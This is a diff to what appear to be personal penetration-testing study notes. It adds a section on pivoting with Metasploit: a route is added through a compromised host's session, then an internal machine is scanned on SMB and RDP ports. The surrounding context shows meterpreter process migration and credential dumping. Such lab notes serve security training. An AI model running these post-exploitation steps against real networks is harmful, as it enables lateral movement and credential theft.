@@ -2830,7 +2830,24 @@ meterpreter > migrate 3568
      meterpreter > creds_msv
      #+end_src
      
-*** Pivoting with the Metasploit Framework
+*** Pivoting with the Metasploit Framework (route through established session)
+    + src:
+    #+begin_src meterpreter
+C:\Users\offsec>ipconfig
+  # in compromised machine
+  # IPv4 Address. . . . . . . . . . . : 192.168.1.111
+
+msf5 > route add 192.168.1.0/24 11
+  # [*] Route added
+  # msf5 > route print
+  # Subnet          Netmask          Gateway
+  # 192.168.1.0     255.255.255.0    Session 11
+
+msf5 > use auxiliary/scanner/portscan/tcp
+msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.110
+msf5 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
+msf5 auxiliary(scanner/portscan/tcp) > run
+    #+end_src
 
 * TODO list
   + AD, LDAP enum users
